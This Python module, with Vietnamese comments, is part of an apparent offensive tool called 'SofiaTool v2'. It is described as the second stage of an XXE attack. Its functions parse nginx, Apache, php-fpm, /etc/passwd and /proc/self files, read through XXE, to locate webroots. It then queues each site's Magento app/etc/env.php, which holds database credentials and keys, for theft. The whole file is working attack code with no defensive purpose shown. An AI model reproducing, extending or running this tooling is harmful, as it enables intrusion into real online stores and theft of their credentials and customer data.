"""SofiaTool v2 — tầng 2: đọc config qua XXE → trích webroot.

extract_roots() áp regex lên nội dung config:
  nginx:   root /var/www/html;  (có thể có server block, lấy cái đầu tiên)
  apache:  DocumentRoot "/var/www/html"
  php-fpm: chdir = /var/www/html  (pool www.conf)
  environ: SCRIPT_FILENAME=/var/www/html/index.php, PWD=/var/www/html
Sinh ra <root>/app/etc/env.php để đẩy vào hàng đợi hunter.

Ngoài ra còn 2 nguồn "mở khóa" (branch theo tên file):
  /etc/passwd          → user có home /home/<u> → /home/<u>/{public_html,www,htdocs}
  /proc/self/mountinfo → mount point không phải hệ thống → /bitnami/magento, docker volume
"""
import re

from core.logger import get_logger

log = get_logger()

_NGINX_ROOT = re.compile(r"(?:^|\s)root\s+([^;]+);", re.M)
_APACHE_ROOT = re.compile(r"DocumentRoot\s+\"?([^\"\s]+)\"?", re.M)
_NGINX_MAGE_ROOT = re.compile(r"set\s+\$MAGE_ROOT(?:_DIR)?\s+([^;]+);", re.M)
_CHDIR = re.compile(r"^\s*chdir\s*=\s*(.+)$", re.M)
_SCRIPT_FILENAME = re.compile(r"SCRIPT_FILENAME=([^\x00]+)", re.M)
_PWD = re.compile(r"PWD=([^\x00]+)", re.M)

# Tiền tố hệ thống — không phải webroot (dùng cho mountinfo).
_SYS_PREFIXES = (
    "/proc", "/sys", "/dev", "/run", "/tmp", "/etc", "/usr",
    "/lib", "/bin", "/sbin", "/boot", "/snap", "/mnt", "/media",
    "/var/lib", "/var/log", "/var/cache", "/var/run", "/var/tmp",
)

# Chặn flood: cPanel httpd.conf có thể chứa hàng trăm DocumentRoot.
_MAX_PUSH_PER_SOURCE = 20


def extract_roots(content):
    """Trả list webroot trích được từ nội dung config (đã strip, dedup).

    Ưu tiên webroot từ nginx Magento template (set $MAGE_ROOT ...).
    """
    # nginx Magento: set $MAGE_ROOT /path; / set $MAGE_ROOT_DIR /path;
    mage_roots = []
    for m in _NGINX_MAGE_ROOT.findall(content or ""):
        v = m.strip().strip('"').rstrip("/")
        if v.startswith("/") and v not in mage_roots:
            mage_roots.append(v)
    roots = []
    for pat in (_NGINX_ROOT, _APACHE_ROOT, _CHDIR):
        for m in pat.findall(content or ""):
            v = m.strip().strip(";").strip('"')
            if "$MAGE_ROOT" in v and mage_roots:
                v = v.replace("$MAGE_ROOT", mage_roots[0])
            if v.startswith(("$", "/usr", "/etc")):
                continue  # biến nginx chưa phân giải hoặc path hệ thống
            if v.rsplit("/", 1)[-1] == "pub" and v != "/":
                v = v.rsplit("/", 1)[0]  # docroot = <webroot>/pub -> webroot
            roots.append(v)
    for pat in (_SCRIPT_FILENAME, _PWD):
        for m in pat.findall(content or ""):
            v = m.strip()
            if "index.php" in v:
                v = v.rsplit("/index.php", 1)[0]
            roots.append(v)
    out = []
    for r in (mage_roots + roots):  # MAGE_ROOT lên đầu — specific nhất
        r = r.rstrip("/")
        if r and r not in out:
            out.append(r)
    return out


def extract_mount_roots(content):
    """Từ /proc/self/mountinfo: mount point không phải hệ thống.

    Dòng mountinfo: "194 178 0:49 / /var/www/html rw,relatime - ext4 /dev/.."
    parts[3] = root, parts[4] = mount point (space bị escape thành \\040).
    """
    roots = []
    for line in (content or "").splitlines():
        parts = line.split()
        if len(parts) < 5:
            continue
        mp = parts[4].replace("\\040", " ")
        if " " in mp or mp == "/" or not mp.startswith("/"):
            continue
        if mp.startswith(_SYS_PREFIXES):
            continue
        if mp not in roots:
            roots.append(mp)
    return roots


def extract_passwd_users(content):
    """Từ /etc/passwd: home dir của user thật (uid >= 1000, home /home/...)."""
    homes = []
    for line in (content or "").splitlines():
        parts = line.split(":")
        if len(parts) < 6:
            continue
        try:
            uid = int(parts[2])
        except ValueError:
            continue
        home = parts[5].strip()
        if uid >= 1000 and home.startswith("/home/") and home not in homes:
            homes.append(home)
    return homes


def _roots_for(content, source):
    """Chọn cách trích root theo tên file config."""
    name = source.rsplit("/", 1)[-1]
    if name == "passwd":
        out = []
        for h in extract_passwd_users(content):
            for sub in ("public_html", "www", "htdocs"):
                out.append(f"{h}/{sub}")
        return out
    if name == "mountinfo":
        return extract_mount_roots(content)
    return extract_roots(content)


def push_roots(hunter, content, source):
    """Trích root từ config và đẩy <root>/app/etc/env.php vào hunter."""
    roots = _roots_for(content, source)
    if not roots:
        log.info("config_hunter: %s — không trích được root", source)
        return []
    pushed = []
    for r in roots:
        if len(pushed) >= _MAX_PUSH_PER_SOURCE:
            log.info("config_hunter: %s — vượt cap %d, bỏ qua phần còn lại",
                     source, _MAX_PUSH_PER_SOURCE)
            break
        p = f"{r}/app/etc/env.php"
        if hunter.push_candidate(p, f"{source}:{r}"):
            pushed.append(p)
    if pushed:
        log.info("config_hunter: %s -> %d path (%s)", source, len(pushed), pushed[:3])
    return pushed


